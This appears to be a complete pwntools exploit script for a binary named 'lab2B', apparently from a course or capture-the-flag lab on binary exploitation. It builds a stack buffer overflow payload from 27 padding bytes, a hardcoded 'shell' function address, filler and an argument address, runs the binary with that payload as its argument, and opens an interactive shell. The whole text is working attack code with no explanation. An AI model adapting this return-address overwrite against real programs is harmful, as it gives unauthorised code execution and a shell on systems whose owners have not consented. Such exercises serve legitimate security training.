from pwn import *


shell = p32(0x080486bd)
arg_shell = p32(0x80487d0)
payload = ""
payload += 'A'*27 + shell + 'AAAA'+ arg_shell
sh = process(argv = ['./lab2B', payload])
sh.interactive()
